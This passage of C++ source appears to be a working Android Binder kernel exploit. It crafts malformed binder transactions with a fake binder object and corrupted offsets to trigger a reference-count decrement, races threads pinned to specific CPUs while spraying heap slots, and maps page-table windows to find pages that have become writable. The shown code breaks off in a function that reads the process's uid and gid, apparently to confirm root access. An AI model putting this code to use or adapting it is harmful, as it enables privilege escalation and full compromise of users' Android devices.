void* run_split_decrement(void* argument) {
    auto* context = static_cast<SplitDecrementContext*>(argument);
    SplitDecrementExitMarker exit_marker {context};
    context->tid = static_cast<pid_t>(syscall(SYS_gettid));
    if (context->tid <= 0) {
        context->phase.store(-1, std::memory_order_release);
        split_decrement_wake(&context->phase);
        return nullptr;
    }
    int write_affinity_errno = 0;
    if (!pin_current_thread_to_cpu(
                2, &write_affinity_errno, &context->write_enter_cpu)) {
        context->write_errno = write_affinity_errno;
        context->phase.store(-1, std::memory_order_release);
        split_decrement_wake(&context->phase);
        return nullptr;
    }
    if (context->write_enter_cpu != 2) {
        context->phase.store(-2, std::memory_order_release);
        split_decrement_wake(&context->phase);
        return nullptr;
    }
    context->phase.store(kSplitDecrementPhaseReady,
                         std::memory_order_release);
    split_decrement_wake(&context->phase);
    while (context->go.load(std::memory_order_acquire) == 0 &&
           context->release.load(std::memory_order_acquire) == 0) {
        syscall(SYS_futex, &context->go, FUTEX_WAIT_PRIVATE, 0,
                nullptr, nullptr, 0);
    }
    if (context->cancel.load(std::memory_order_acquire) ||
        context->go.load(std::memory_order_acquire) == 0) {
        context->phase.store(-6, std::memory_order_release);
        split_decrement_wake(&context->phase);
        return nullptr;
    }

    constexpr binder_size_t data_size = 256;
    constexpr binder_size_t offsets_size = 2 * sizeof(binder_size_t);
    constexpr binder_size_t trigger = data_size + offsets_size;
    constexpr std::size_t object_size = sizeof(flat_binder_object);
    static_assert(object_size == 24);
    std::uint8_t data[trigger] {};
    binder_size_t offsets[2] {0, trigger};
    flat_binder_object target_object {};
    target_object.hdr.type = BINDER_TYPE_HANDLE;
    target_object.handle = static_cast<std::uint32_t>(context->target);
    std::memcpy(data, &target_object, sizeof(target_object));
    flat_binder_object fake_victim {};
    fake_victim.hdr.type = BINDER_TYPE_BINDER;
    fake_victim.binder = context->victim_pointer;
    fake_victim.cookie = context->victim_cookie;
    std::memcpy(data + object_size, &fake_victim, sizeof(fake_victim));
    binder_size_t corrupted_offset = object_size;
    std::memcpy(data + data_size, &corrupted_offset,
                sizeof(corrupted_offset));
    binder_transaction_data transaction {};
    transaction.target.handle = static_cast<std::uint32_t>(context->target);
    transaction.code = 1;
    transaction.data_size = data_size;
    transaction.offsets_size = offsets_size;
    transaction.data.ptr.buffer = reinterpret_cast<binder_uintptr_t>(data);
    transaction.data.ptr.offsets =
            reinterpret_cast<binder_uintptr_t>(offsets);
    std::uint8_t write_buffer[kSplitDecrementWriteSize] {};
    write_command(write_buffer, BC_TRANSACTION, &transaction,
                  sizeof(transaction));
    binder_write_read request {};
    request.write_size = sizeof(write_buffer);
    request.write_buffer = reinterpret_cast<binder_uintptr_t>(write_buffer);
    request.read_size = 0;
    request.read_buffer = 0;
    errno = 0;
    context->write_attempted.store(true, std::memory_order_release);
    context->write_result = ioctl(context->fd, BINDER_WRITE_READ, &request);
    context->write_errno = errno;
    context->write_consumed = request.write_consumed;
    context->write_read_consumed = request.read_consumed;
    context->write_return_cpu = sched_getcpu();
    bool exact_write = context->write_result == 0 &&
            context->write_errno == 0 &&
            context->write_consumed == sizeof(write_buffer) &&
            request.read_consumed == 0 &&
            context->write_enter_cpu == 2 &&
            context->write_return_cpu == 2 && context->tid > 0;
    if (exact_write && context->generation_valid &&
        context->staged_generation != 0) {
        g_fake_control_staged_gate.store(context->staged_generation,
                                         std::memory_order_release);
        syscall(SYS_futex, &g_fake_control_staged_gate,
                FUTEX_WAKE_PRIVATE, INT_MAX, nullptr, nullptr, 0);
        context->staged_wake = true;
    }
    context->exact_write = exact_write && context->staged_wake;
    if (!context->exact_write) {
        context->phase.store(-3, std::memory_order_release);
        split_decrement_wake(&context->phase);
        return nullptr;
    }
    context->phase.store(kSplitDecrementPhaseParked,
                         std::memory_order_release);
    split_decrement_wake(&context->phase);
    while (context->release.load(std::memory_order_acquire) == 0) {
        syscall(SYS_futex, &context->release, FUTEX_WAIT_PRIVATE, 0,
                nullptr, nullptr, 0);
    }

    int read_affinity_errno = 0;
    if (!pin_current_thread_to_cpu(
                1, &read_affinity_errno, &context->read_enter_cpu)) {
        context->read_errno = read_affinity_errno;
        context->phase.store(-4, std::memory_order_release);
        split_decrement_wake(&context->phase);
        return nullptr;
    }
    if (context->read_enter_cpu != 1) {
        context->read_errno = EINVAL;
        context->phase.store(-4, std::memory_order_release);
        split_decrement_wake(&context->phase);
        return nullptr;
    }
    context->read_tid = static_cast<pid_t>(syscall(SYS_gettid));
    if (context->read_tid != context->tid) {
        context->read_errno = ECHILD;
        context->phase.store(-4, std::memory_order_release);
        split_decrement_wake(&context->phase);
        return nullptr;
    }
    struct pollfd poll_descriptor {};
    poll_descriptor.fd = context->fd;
    poll_descriptor.events = POLLIN;
    errno = 0;
    context->poll_result = poll(&poll_descriptor, 1,
                                kSplitDecrementWaitMs);
    context->poll_errno = errno;
    context->poll_revents = poll_descriptor.revents;
    if (context->poll_result != 1 || context->poll_errno != 0 ||
        context->poll_revents != POLLIN) {
        context->phase.store(-7, std::memory_order_release);
        split_decrement_wake(&context->phase);
        return nullptr;
    }
    std::uint8_t read_buffer[4096] {};
    binder_write_read read_request {};
    read_request.write_size = 0;
    read_request.write_buffer = 0;
    read_request.read_size = sizeof(read_buffer);
    read_request.read_buffer = reinterpret_cast<binder_uintptr_t>(
            read_buffer);
    errno = 0;
    context->read_result = ioctl(context->fd, BINDER_WRITE_READ,
                                 &read_request);
    context->read_errno = errno;
    context->read_consumed = read_request.read_consumed;
    context->read_write_consumed = read_request.write_consumed;
    context->read_return_cpu = sched_getcpu();
    parse_split_decrement_read(context, read_buffer,
                               read_request.read_consumed);
    if (context->read_tid != context->tid ||
        context->read_enter_cpu != 1 || context->read_return_cpu != 1 ||
        !context->exact_read) {
        context->phase.store(-5, std::memory_order_release);
    } else {
        context->phase.store(kSplitDecrementPhaseReadDone,
                             std::memory_order_release);
    }
    split_decrement_wake(&context->phase);
    return nullptr;
}

void release_split_decrement_thread(SplitDecrementContext* context) {
    context->release.store(1, std::memory_order_release);
    split_decrement_wake(&context->release);
}

void cancel_split_decrement_thread(SplitDecrementContext* context) {
    context->cancel.store(true, std::memory_order_release);
    context->release.store(1, std::memory_order_release);
    context->go.store(1, std::memory_order_release);
    split_decrement_wake(&context->release);
    split_decrement_wake(&context->go);
}

bool join_split_decrement_thread(SplitDecrementContext* context,
                                 bool cancel_before_go) {
    if (!context->thread_created) {
        return true;
    }
    if (cancel_before_go) {
        cancel_split_decrement_thread(context);
    } else {
        release_split_decrement_thread(context);
    }
    bool finished = false;
    for (int elapsed = 0; elapsed < kSplitDecrementWaitMs; ++elapsed) {
        if (context->thread_exited.load(std::memory_order_acquire)) {
            finished = true;
            break;
        }
        usleep(1000);
    }
    if (!finished) {
        context->join_timed_out = true;
        context->join_result = ETIMEDOUT;
        return false;
    }
    // The Android NDK has no timed join. The worker marks exit before return.
    int joined = pthread_join(context->thread, nullptr);
    context->join_result = joined;
    context->thread_joined = joined == 0;
    return finished && context->thread_joined;
}

bool activate_split_decrement_spray(SplitDecrementContext* context) {
    if (context == nullptr || context->coordinator_cpu != 1 ||
        !wait_split_decrement_phase(*context,
                kSplitDecrementPhaseReady, kSplitDecrementWaitMs)) {
        return false;
    }
    {
        std::lock_guard<std::mutex> lock(g_fake_control_mutex);
        context->retirement_before_go =
                g_terminal_fd_retirement_gate.load(
                        std::memory_order_acquire);
        context->generation_valid =
                split_decrement_generation_current_locked(*context, true);
        if (context->retirement_before_go || !context->generation_valid) {
            return false;
        }
        context->go_issued = true;
        context->go.store(1, std::memory_order_release);
    }
    split_decrement_wake(&context->go);
    if (!wait_split_decrement_phase(*context,
                kSplitDecrementPhaseParked, kSplitDecrementWaitMs)) {
        return false;
    }
    auto state_snapshot = [&](bool staged_only) {
        std::pair<int, bool> result {0, false};
        std::lock_guard<std::mutex> lock(g_fake_control_mutex);
        if (!split_decrement_generation_current_locked(*context, false)) {
            result.second = true;
            return result;
        }
        for (const auto& slot : g_fake_control_slots) {
            if (staged_only ? !fake_control_slot_active_staged(slot) :
                              (slot.poisoned || !slot.created)) {
                continue;
            }
            int state = slot.state.load(std::memory_order_acquire);
            if (state == 2) {
                ++result.first;
            } else if (state >= 3) {
                result.second = true;
            }
        }
        return result;
    };
    bool staged_entered = false;
    for (int attempt = 0; attempt < 2000; ++attempt) {
        if (g_terminal_fd_retirement_gate.load(std::memory_order_acquire)) {
            break;
        }
        auto state = state_snapshot(true);
        if (state.second) {
            break;
        }
        if (state.first == kFakeControlStagedCount) {
            context->staged_state2 = state.first;
            staged_entered = true;
            break;
        }
        usleep(1000);
    }
    if (!staged_entered) {
        return false;
    }
    usleep(1000);
    auto stable_state = state_snapshot(true);
    context->staged_state2 = stable_state.first;
    context->staged_stable = !stable_state.second &&
            stable_state.first == kFakeControlStagedCount;
    if (!context->staged_stable) {
        return false;
    }
    {
        std::lock_guard<std::mutex> lock(g_fake_control_mutex);
        if (g_terminal_fd_retirement_gate.load(
                    std::memory_order_acquire) ||
            !split_decrement_generation_current_locked(*context, true)) {
            return false;
        }
        g_fake_control_gate.store(1, std::memory_order_release);
        syscall(SYS_futex, &g_fake_control_gate, FUTEX_WAKE_PRIVATE,
                INT_MAX, nullptr, nullptr, 0);
        context->global_published = true;
    }
    bool all_entered = false;
    for (int attempt = 0; attempt < 2000; ++attempt) {
        if (g_terminal_fd_retirement_gate.load(std::memory_order_acquire)) {
            break;
        }
        auto state = state_snapshot(false);
        context->all_state2 = state.first;
        if (state.second) {
            break;
        }
        int expected = 0;
        {
            std::lock_guard<std::mutex> lock(g_fake_control_mutex);
            expected = g_fake_control_expected;
        }
        if (state.first == expected && expected > 0) {
            all_entered = true;
            break;
        }
        usleep(1000);
    }
    context->all_entered = all_entered;
    if (!all_entered) {
        return false;
    }
    usleep(200000);
    auto final_state = state_snapshot(false);
    context->blocked = final_state.first;
    context->retirement_after_write =
            g_terminal_fd_retirement_gate.load(std::memory_order_acquire);
    if (context->retirement_after_write || final_state.second ||
        final_state.first != context->expected) {
        return false;
    }
    {
        std::lock_guard<std::mutex> lock(g_fake_control_mutex);
        if (!split_decrement_generation_current_locked(*context, true)) {
            return false;
        }
    }
    release_split_decrement_thread(context);
    if (!wait_split_decrement_phase(*context,
                kSplitDecrementPhaseReadDone, kSplitDecrementWaitMs)) {
        return false;
    }
    return context->exact_read && context->read_tid == context->tid;
}

struct OverlapDecrementContext {
    pthread_t thread {};
    int fd = -1;
    int target = -1;
    binder_uintptr_t victim_pointer = 0;
    binder_uintptr_t victim_cookie = 0;
    std::atomic<int> phase {0};
    std::atomic<int> go {0};
    std::atomic<int> parked {0};
    std::atomic<int> finish {0};
    CveResult result;
    int enter_cpu = -1;
    int return_cpu = -1;
    int exit_cpu = -1;
};

struct OverlapDecrementResult {
    bool pass = false;
    bool attempted = false;
    bool thread_joined = false;
    int coordinator_cpu = -1;
    int enter_cpu = -1;
    int return_cpu = -1;
    int exit_cpu = -1;
    int prefix = 0;
    int crossing_fence_index = -1;
    int return_index = -1;
    int confirmed_during_ioctl = 0;
    int ambiguous_boundary = 0;
    bool returned_before_spray = false;
    int activated = 0;
    int blocked = 0;
    int expected = 0;
    int final_phase = 0;
    CveResult decrement;
};

OverlapDecrementContext g_overlap_decrement;
bool g_overlap_decrement_in_use = false;

void* run_overlap_decrement(void* argument) {
    auto* context = static_cast<OverlapDecrementContext*>(argument);
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(2, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0) {
        context->phase.store(-errno, std::memory_order_release);
        return nullptr;
    }
    context->enter_cpu = sched_getcpu();
    context->phase.store(1, std::memory_order_release);
    while (context->go.load(std::memory_order_acquire) == 0 &&
           context->finish.load(std::memory_order_acquire) == 0) {
        syscall(SYS_futex, &context->go, FUTEX_WAIT_PRIVATE, 0,
                nullptr, nullptr, 0);
    }
    if (context->finish.load(std::memory_order_acquire) != 0) {
        CPU_ZERO(&set);
        CPU_SET(1, &set);
        int migrated = sched_setaffinity(0, sizeof(set), &set);
        context->exit_cpu = migrated == 0 ? sched_getcpu() : -1;
        context->phase.store(migrated == 0 ? 4 : -errno,
                             std::memory_order_release);
        return nullptr;
    }
    context->phase.store(2, std::memory_order_release);
    context->result = send_single_decrement(
            context->fd, context->target,
            context->victim_pointer, context->victim_cookie,
            &context->phase, &context->parked, &context->finish);
    context->return_cpu = sched_getcpu();
    CPU_ZERO(&set);
    CPU_SET(1, &set);
    int migrated = sched_setaffinity(0, sizeof(set), &set);
    context->exit_cpu = migrated == 0 ? sched_getcpu() : -1;
    context->phase.store(migrated == 0 ? 4 : -errno,
                         std::memory_order_release);
    return nullptr;
}

[[maybe_unused]] OverlapDecrementResult run_overlap_decrement_and_spray(
        int fd, int target, binder_uintptr_t victim_pointer,
        binder_uintptr_t victim_cookie) {
    constexpr int kPrefix = 32;
    constexpr int kReservedTail = 128;
    OverlapDecrementResult outcome;
    outcome.expected = g_fake_control_expected;
    if (fd < 0 || target <= 0 || g_overlap_decrement_in_use ||
        outcome.expected <= kPrefix + kReservedTail) {
        if (fd >= 0) {
            close(fd);
        }
        return outcome;
    }

    cpu_set_t coordinator_set;
    CPU_ZERO(&coordinator_set);
    CPU_SET(1, &coordinator_set);
    if (sched_setaffinity(0, sizeof(coordinator_set), &coordinator_set) != 0) {
        close(fd);
        return outcome;
    }
    outcome.coordinator_cpu = sched_getcpu();

    auto& context = g_overlap_decrement;
    g_overlap_decrement_in_use = true;
    context.fd = fd;
    context.target = target;
    context.victim_pointer = victim_pointer;
    context.victim_cookie = victim_cookie;
    context.phase.store(0, std::memory_order_relaxed);
    context.go.store(0, std::memory_order_relaxed);
    context.parked.store(0, std::memory_order_relaxed);
    context.finish.store(0, std::memory_order_relaxed);
    context.result = CveResult {};
    context.enter_cpu = -1;
    context.return_cpu = -1;
    context.exit_cpu = -1;

    bool created = pthread_create(
            &context.thread, nullptr, run_overlap_decrement, &context) == 0;
    auto deadline = std::chrono::steady_clock::now() +
            std::chrono::seconds(5);
    auto before_deadline = [&]() {
        return std::chrono::steady_clock::now() < deadline;
    };
    auto wait_for_phase = [&](int minimum) {
        while (context.phase.load(std::memory_order_acquire) >= 0 &&
               context.phase.load(std::memory_order_acquire) < minimum &&
               before_deadline()) {
            usleep(50);
        }
        return context.phase.load(std::memory_order_acquire) >= minimum;
    };
    int cursor = 0;
    auto activate_next = [&]() -> int {
        while (cursor < kFakeControlSprayCount &&
               g_fake_control_slots[cursor].poisoned) {
            ++cursor;
        }
        if (cursor >= kFakeControlSprayCount || !before_deadline()) {
            return -1;
        }
        auto& slot = g_fake_control_slots[cursor++];
        slot.activation.store(1, std::memory_order_release);
        syscall(SYS_futex, &slot.activation, FUTEX_WAKE_PRIVATE, 1,
                nullptr, nullptr, 0);
        while (slot.state.load(std::memory_order_acquire) < 2 &&
               before_deadline()) {
            sched_yield();
            usleep(50);
        }
        if (slot.state.load(std::memory_order_acquire) != 2) {
            return -1;
        }
        sched_yield();
        usleep(100);
        if (slot.state.load(std::memory_order_acquire) != 2) {
            return -1;
        }
        return ++outcome.activated;
    };
    auto restore_cpu2 = [&]() {
        cpu_set_t restore_set;
        CPU_ZERO(&restore_set);
        CPU_SET(2, &restore_set);
        return sched_setaffinity(0, sizeof(restore_set), &restore_set) == 0;
    };
    auto stop_before_attempt = [&]() {
        context.finish.store(1, std::memory_order_release);
        context.go.store(1, std::memory_order_release);
        syscall(SYS_futex, &context.go, FUTEX_WAKE_PRIVATE, 1,
                nullptr, nullptr, 0);
        outcome.thread_joined =
                pthread_join(context.thread, nullptr) == 0;
        if (outcome.thread_joined) {
            close(fd);
            restore_cpu2();
            g_overlap_decrement_in_use = false;
        }
    };

    if (!created) {
        close(fd);
        restore_cpu2();
        g_overlap_decrement_in_use = false;
        return outcome;
    }
    if (!wait_for_phase(1)) {
        stop_before_attempt();
        outcome.final_phase = context.phase.load(std::memory_order_acquire);
        return outcome;
    }
    while (outcome.activated < kPrefix && activate_next() > 0) {
    }
    outcome.prefix = outcome.activated;
    if (outcome.prefix != kPrefix) {
        stop_before_attempt();
        outcome.final_phase = context.phase.load(std::memory_order_acquire);
        return outcome;
    }

    outcome.attempted = true;
    context.go.store(1, std::memory_order_release);
    syscall(SYS_futex, &context.go, FUTEX_WAKE_PRIVATE, 1,
            nullptr, nullptr, 0);
    if (!wait_for_phase(2)) {
        outcome.final_phase = context.phase.load(std::memory_order_acquire);
        return outcome;
    }

    int middle_limit = outcome.expected - kReservedTail;
    bool return_fence_observed = false;
    while (outcome.activated < middle_limit) {
        int phase_before = context.phase.load(std::memory_order_acquire);
        if (phase_before >= 3) {
            break;
        }
        int activated_index = activate_next();
        if (activated_index < 0) {
            outcome.final_phase =
                    context.phase.load(std::memory_order_acquire);
            return outcome;
        }
        int phase_after = context.phase.load(std::memory_order_acquire);
        if (phase_before == 2 && phase_after == 2) {
            ++outcome.confirmed_during_ioctl;
        } else if (phase_before == 2 && phase_after >= 3) {
            ++outcome.ambiguous_boundary;
            outcome.crossing_fence_index = activated_index;
            return_fence_observed = phase_after == 3 &&
                    outcome.confirmed_during_ioctl == 0 &&
                    outcome.ambiguous_boundary == 1 &&
                    activated_index == outcome.prefix + 1 &&
                    context.parked.load(std::memory_order_acquire) == 1;
        }
        if (phase_after >= 3) {
            break;
        }
    }
    if (!wait_for_phase(3)) {
        outcome.final_phase = context.phase.load(std::memory_order_acquire);
        return outcome;
    }
    while (context.parked.load(std::memory_order_acquire) == 0 &&
           before_deadline()) {
        usleep(50);
    }
    if (context.phase.load(std::memory_order_acquire) < 3 ||
        context.parked.load(std::memory_order_acquire) == 0) {
        outcome.final_phase = context.phase.load(std::memory_order_acquire);
        return outcome;
    }
    int phase_before_claimant =
            context.phase.load(std::memory_order_acquire);
    bool parked_before_claimant =
            context.parked.load(std::memory_order_acquire) == 1;
    int claimant_index = return_fence_observed
            ? outcome.crossing_fence_index : activate_next();
    if (claimant_index < 0 || claimant_index >= outcome.expected) {
        outcome.final_phase = context.phase.load(std::memory_order_acquire);
        return outcome;
    }
    outcome.return_index = claimant_index;
    outcome.returned_before_spray =
            phase_before_claimant >= 3 && parked_before_claimant &&
            outcome.confirmed_during_ioctl == 0 &&
            outcome.ambiguous_boundary == 0 &&
            outcome.crossing_fence_index == -1 &&
            outcome.return_index == outcome.prefix + 1;
    while (outcome.activated < outcome.expected && activate_next() > 0) {
    }
    if (outcome.activated != outcome.expected) {
        outcome.final_phase = context.phase.load(std::memory_order_acquire);
        return outcome;
    }
    for (const auto& slot : g_fake_control_slots) {
        if (!slot.poisoned) {
            outcome.blocked +=
                    slot.state.load(std::memory_order_acquire) == 2;
        }
    }

    context.finish.store(1, std::memory_order_release);
    syscall(SYS_futex, &context.finish, FUTEX_WAKE_PRIVATE, 1,
            nullptr, nullptr, 0);
    auto finish_deadline = std::chrono::steady_clock::now() +
            std::chrono::seconds(2);
    while (context.phase.load(std::memory_order_acquire) >= 0 &&
           context.phase.load(std::memory_order_acquire) < 4 &&
           std::chrono::steady_clock::now() < finish_deadline) {
        usleep(50);
    }
    outcome.final_phase = context.phase.load(std::memory_order_acquire);
    if (outcome.final_phase == 4 || outcome.final_phase < 0) {
        outcome.thread_joined =
                pthread_join(context.thread, nullptr) == 0;
    }
    if (!outcome.thread_joined) {
        return outcome;
    }
    outcome.enter_cpu = context.enter_cpu;
    outcome.return_cpu = context.return_cpu;
    outcome.exit_cpu = context.exit_cpu;
    outcome.decrement = context.result;
    close(fd);
    bool restored = restore_cpu2();
    g_overlap_decrement_in_use = false;
    outcome.pass = outcome.thread_joined && restored &&
            outcome.final_phase == 4 && outcome.coordinator_cpu == 1 &&
            outcome.enter_cpu == 2 && outcome.return_cpu == 2 &&
            outcome.exit_cpu == 1 &&
            outcome.prefix == kPrefix &&
            (outcome.confirmed_during_ioctl > 0 ||
             return_fence_observed ||
             outcome.returned_before_spray) &&
            outcome.return_index > 0 &&
            outcome.return_index < outcome.expected &&
            outcome.activated == outcome.expected &&
            outcome.blocked == outcome.expected &&
            outcome.decrement.ioctl_result == 0 &&
            outcome.decrement.failed_reply &&
            !outcome.decrement.dead_reply;
    return outcome;
}

bool queue_oneway(int fd, int target) {
    binder_transaction_data transaction {};
    transaction.target.handle = static_cast<std::uint32_t>(target);
    transaction.code = kNodeHoldCode;
    transaction.flags = TF_ONE_WAY;
    std::uint8_t write_buffer[
            sizeof(std::uint32_t) + sizeof(transaction)] {};
    write_command(write_buffer, BC_TRANSACTION, &transaction,
                  sizeof(transaction));
    std::uint8_t read_buffer[512] {};
    binder_write_read request {};
    request.write_size = sizeof(write_buffer);
    request.write_buffer = reinterpret_cast<binder_uintptr_t>(write_buffer);
    request.read_size = sizeof(read_buffer);
    request.read_buffer = reinterpret_cast<binder_uintptr_t>(read_buffer);
    if (ioctl(fd, BINDER_WRITE_READ, &request) != 0) {
        return false;
    }
    bool complete = false;
    for (std::size_t offset = 0;
         offset + sizeof(std::uint32_t) <= request.read_consumed;) {
        std::uint32_t response = 0;
        std::memcpy(&response, read_buffer + offset, sizeof(response));
        offset += sizeof(response);
        std::size_t payload_size = _IOC_SIZE(response);
        if (offset + payload_size > request.read_consumed) {
            return false;
        }
        complete |= response == BR_TRANSACTION_COMPLETE ||
                response == BR_ONEWAY_SPAM_SUSPECT;
        if (response == BR_FAILED_REPLY || response == BR_DEAD_REPLY) {
            return false;
        }
        offset += payload_size;
    }
    return complete;
}

void* map_aligned(std::size_t size, std::size_t alignment) {
    if (size == 0 || alignment == 0 ||
        (alignment & (alignment - 1U)) != 0) {
        errno = EINVAL;
        return MAP_FAILED;
    }
    std::size_t reservation_size = size + alignment;
    void* reservation = mmap(nullptr, reservation_size, PROT_NONE,
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);
    if (reservation == MAP_FAILED) {
        return MAP_FAILED;
    }
    std::uintptr_t start = reinterpret_cast<std::uintptr_t>(reservation);
    std::uintptr_t aligned = (start + alignment - 1U) &
            ~(static_cast<std::uintptr_t>(alignment) - 1U);
    std::size_t prefix = static_cast<std::size_t>(aligned - start);
    std::size_t suffix = reservation_size - prefix - size;
    if (prefix != 0) {
        munmap(reservation, prefix);
    }
    if (suffix != 0) {
        munmap(reinterpret_cast<void*>(aligned + size), suffix);
    }
    return reinterpret_cast<void*>(aligned);
}

void clear_pte_plan() {
    for (void* window : g_pte_windows) {
        munmap(window, kPteWindowSize);
    }
    g_pte_windows.clear();
    g_pte_probes.clear();
    if (g_pte_backing >= 0) {
        close(g_pte_backing);
        g_pte_backing = -1;
    }
}

std::string prepare_pte_plan() {
    clear_pte_plan();
#if defined(__NR_memfd_create)
    g_pte_backing = static_cast<int>(syscall(__NR_memfd_create,
            "lp3-direct-pte", 1U));
#else
    errno = ENOSYS;
    g_pte_backing = -1;
#endif
    if (g_pte_backing < 0 || ftruncate(g_pte_backing, kPteSpan) != 0) {
        int saved_errno = errno;
        clear_pte_plan();
        char state[160];
        std::snprintf(state, sizeof(state),
                      "status=fail stage=pte-prepare reason=backing errno=%d",
                      saved_errno);
        return state;
    }

    int candidate_offsets[kPteCandidates] {};
    for (int index = 0; index < kPteCandidates; ++index) {
        candidate_offsets[index] = 0x50 + index * 0x80;
        int probe_page = candidate_offsets[index] / 8;
        std::uint8_t marker = static_cast<std::uint8_t>(0xa5U ^ probe_page);
        if (pwrite(g_pte_backing, &marker, sizeof(marker),
                   static_cast<off_t>(probe_page) * kPageSize) != 1) {
            int saved_errno = errno;
            clear_pte_plan();
            char state[160];
            std::snprintf(state, sizeof(state),
                          "status=fail stage=pte-prepare reason=pwrite"
                          " errno=%d", saved_errno);
            return state;
        }
    }

    constexpr int usable_slots = kPteEntries - 1;
    constexpr int requested = kPteCandidates * kPteMappingsPerCandidate;
    constexpr int window_count =
            (requested + usable_slots - 1) / usable_slots;
    int prepared = 0;
    int saved_errno = 0;
    g_pte_windows.reserve(window_count);
    g_pte_probes.reserve(requested);
    int guard_page = candidate_offsets[0] / 8;
    for (int index = 0; index < window_count; ++index) {
        void* window = map_aligned(kPteWindowSize, kPteWindowSize);
        if (window == MAP_FAILED) {
            saved_errno = errno;
            break;
        }
        void* guard_address = static_cast<std::uint8_t*>(window) +
                static_cast<std::size_t>(guard_page) * kPageSize;
        void* guard = mmap(guard_address, kPageSize, PROT_READ,
                MAP_SHARED | MAP_FIXED, g_pte_backing,
                static_cast<off_t>(guard_page) * kPageSize);
        if (guard == MAP_FAILED) {
            saved_errno = errno;
            munmap(window, kPteWindowSize);
            break;
        }
        volatile std::uint8_t value =
                *static_cast<volatile std::uint8_t*>(guard);
        (void)value;
        g_pte_windows.push_back(window);
    }

    if (static_cast<int>(g_pte_windows.size()) == window_count) {
        for (int index = 0; index < requested; ++index) {
            int window_index = index / usable_slots;
            int window_slot = index % usable_slots + 1;
            int candidate_index = index / kPteMappingsPerCandidate;
            int candidate_offset = candidate_offsets[candidate_index];
            int probe_page = candidate_offset / 8;
            void* address = static_cast<std::uint8_t*>(
                    g_pte_windows[static_cast<std::size_t>(window_index)]) +
                    static_cast<std::size_t>(window_slot) * kPteSpan +
                    static_cast<std::size_t>(probe_page) * kPageSize;
            void* mapping = mmap(address, kPageSize, PROT_READ,
                    MAP_SHARED | MAP_FIXED, g_pte_backing,
                    static_cast<off_t>(probe_page) * kPageSize);
            if (mapping == MAP_FAILED) {
                saved_errno = errno;
                break;
            }
            g_pte_probes.push_back({mapping, candidate_offset});
            prepared++;
        }
    }

    bool pass = prepared == requested && saved_errno == 0;
    if (!pass) {
        clear_pte_plan();
    }
    char state[640];
    std::snprintf(state, sizeof(state),
                  "status=%s stage=pte-prepare candidates=%d mappings=%d"
                  " windows=%zu allocate_on_fault=1 upper_prewarmed=%zu"
                  " first_offset=0x50 last_offset=0xfd0 faulted=0 errno=%d"
                  " cpu=%d",
                  pass ? "pass" : "fail", kPteCandidates, prepared,
                  g_pte_windows.size(), g_pte_windows.size(), saved_errno,
                  sched_getcpu());
    return state;
}

std::string fault_pte_plan() {
    int faulted = 0;
    int armed = 0;
    int saved_errno = 0;
    std::uint64_t checksum = 0;
    for (const PteProbe& probe : g_pte_probes) {
        volatile std::uint8_t value =
                *static_cast<volatile std::uint8_t*>(probe.address);
        checksum += value;
        faulted++;
        if (mprotect(probe.address, kPageSize, PROT_NONE) == 0 &&
            mprotect(probe.address, kPageSize, PROT_READ) == 0) {
            armed++;
        } else if (saved_errno == 0) {
            saved_errno = errno;
        }
    }
    bool pass = faulted == static_cast<int>(g_pte_probes.size()) &&
                armed == faulted && saved_errno == 0;
    char state[320];
    std::snprintf(state, sizeof(state),
                  "status=%s stage=pte-fault mappings=%zu faulted=%d"
                  " armed=%d pte_only_faults=%d checksum=0x%" PRIx64
                  " errno=%d cpu=%d",
                  pass ? "pass" : "fail", g_pte_probes.size(), faulted,
                  armed, faulted, checksum, saved_errno, sched_getcpu());
    return state;
}

void fault_handler(int) {
    if (g_fault_jump != nullptr) {
        siglongjmp(*g_fault_jump, 1);
    }
}

bool probe_access(void* address, bool write_access) {
    struct sigaction action {};
    struct sigaction old_segv {};
    struct sigaction old_bus {};
    action.sa_handler = fault_handler;
    sigemptyset(&action.sa_mask);
    if (sigaction(SIGSEGV, &action, &old_segv) != 0) {
        return false;
    }
    if (sigaction(SIGBUS, &action, &old_bus) != 0) {
        sigaction(SIGSEGV, &old_segv, nullptr);
        return false;
    }
    sigjmp_buf jump;
    g_fault_jump = &jump;
    bool accessible = false;
    if (sigsetjmp(jump, 1) == 0) {
        auto* byte = static_cast<volatile std::uint8_t*>(address);
        std::uint8_t value = *byte;
        if (write_access) {
            *byte = value;
        }
        accessible = true;
    }
    g_fault_jump = nullptr;
    sigaction(SIGBUS, &old_bus, nullptr);
    sigaction(SIGSEGV, &old_segv, nullptr);
    return accessible;
}

std::string check_pte_plan() {
    int readable = 0;
    int writable = 0;
    int first_writable_offset = -1;
    for (const PteProbe& probe : g_pte_probes) {
        if (probe_access(probe.address, false)) {
            readable++;
        }
        if (probe_access(probe.address, true)) {
            writable++;
            if (first_writable_offset < 0) {
                first_writable_offset = probe.candidate_offset;
            }
        }
    }
    char state[320];
    std::snprintf(state, sizeof(state),
                  "status=%s stage=pte-check mappings=%zu readable=%d"
                  " writable=%d first_writable_offset=0x%x"
                  " cold_cpu=%d",
                  writable > 0 ? "pass" : "miss", g_pte_probes.size(),
                  readable, writable, first_writable_offset, sched_getcpu());
    return state;
}

int pin_all_threads(int cpu) {
    DIR* directory = opendir("/proc/self/task");
    if (directory == nullptr) {
        return -1;
    }
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    int pinned = 0;
    while (dirent* entry = readdir(directory)) {
        char* end = nullptr;
        long tid = std::strtol(entry->d_name, &end, 10);
        if (end == entry->d_name || *end != '\0' || tid <= 0) {
            continue;
        }
        if (sched_setaffinity(static_cast<pid_t>(tid), sizeof(set), &set) == 0) {
            pinned++;
        }
    }
    closedir(directory);
    return pinned;
}

bool write_all(int fd, const void* data, std::size_t size) {
    const auto* bytes = static_cast<const std::uint8_t*>(data);
    std::size_t written = 0;
    while (written < size) {
        ssize_t count = write(fd, bytes + written, size - written);
        if (count < 0 && errno == EINTR) {
            continue;
        }
        if (count <= 0) {
            return false;
        }
        written += static_cast<std::size_t>(count);
    }
    return true;
}

bool read_command_root_identity(CommandRootIdentity* identity) {
    if (identity == nullptr) {
        return false;
    }
    CommandRootIdentity value;
    value.pid = static_cast<pid_t>(syscall(SYS_getpid));
    value.tid = static_cast<pid_t>(syscall(SYS_gettid));
    int uid_result = static_cast<int>(syscall(
            SYS_getresuid, &value.uid[0], &value.uid[1], &value.uid[2]));
    int gid_result = static_cast<int>(syscall(
